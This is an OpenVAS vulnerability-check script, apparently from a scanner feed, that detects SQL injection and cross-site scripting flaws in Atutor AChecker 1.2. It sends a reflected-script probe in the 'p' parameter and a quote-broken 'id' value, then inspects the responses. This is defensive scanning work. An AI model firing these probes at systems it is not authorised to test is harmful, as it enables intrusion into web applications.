###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_atutor_achecker_mult_sql_inj_n_xss_vuln.nasl 13551 2019-02-09 10:59:55Z cfischer $
#
# Atutor AChecker Multiple SQL Injection and XSS Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801982");
  script_version("$Revision: 13551 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-09 11:59:55 +0100 (Sat, 09 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-09-14 16:05:49 +0200 (Wed, 14 Sep 2011)");
  script_bugtraq_id(49061, 49093);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Atutor AChecker Multiple SQL Injection and XSS Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17630/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/103763/ZSL-2011-5035.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/103762/ZSL-2011-5034.txt");

  script_tag(name:"impact", value:"Successful exploitation will let attackers to execute arbitrary
  script code or to compromise the application, access or modify data, or exploit
  latent vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"Atutor AChecker 1.2 (build r530).");

  script_tag(name:"insight", value:"Multiple flaws are due to:

  - input passed via the parameter 'myown_patch_id' in '/updater/patch_edit.php'
  and the parameter 'id' in '/user/user_create_edit.php' script is not
  properly sanitised before being used in SQL queries.

  - input through the GET parameters 'id', 'p' and 'myown_patch_id' in
  multiple scripts is not sanitized allowing the attacker to execute HTML
  code or disclose the full path of application's residence.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running Atutor AChecker and is prone to multiple
  cross site scripting and SQL injection vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_active");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port)) {
  exit(0);
}

foreach dir (make_list("/AChecker", "/")) {

  if( dir == "/" ) dir = "";
  url = dir + "/checker/index.php";
  res = http_get_cache(item:url, port:port);

  if(res && "Web Accessibility Checker<" >< res && '>Check Accessibility' >< res) {

    url = dir + '/documentation/frame_header.php?p="><script>alert(document.cookie)</script>';
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req);

    if(res =~ "^HTTP/1\.[01] 200" && '"><script>alert(document.cookie)</script>' >< res) {
      report = report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }

    url = dir + "/user/user_create_edit.php?id='1111";
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req);

    if('You have an error in your SQL syntax;' >< res){
      report = report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);